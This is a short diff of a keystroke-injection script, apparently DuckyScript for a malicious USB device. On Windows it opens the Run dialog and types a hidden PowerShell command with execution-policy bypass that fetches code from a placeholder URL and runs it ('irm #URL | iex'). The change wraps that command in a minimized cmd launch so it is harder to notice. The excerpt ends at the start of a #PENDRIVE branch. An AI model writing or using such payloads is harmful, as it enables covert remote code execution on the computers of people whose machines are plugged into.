@@ -53,11 +53,13 @@ END_EXTENSION
 IF ($_OS == WINDOWS) THEN
     GUI r
     DELAY 100
-    STRING powershell -w h -ep b
+    STRING cmd /c start /min "" powershell -w h -ep b
     SPACE
+    STRING "
     STRING_POWERSHELL
         irm #URL | iex
     END_STRING
+    STRING "
     ENTER
     
     IF (#PENDRIVE) THEN
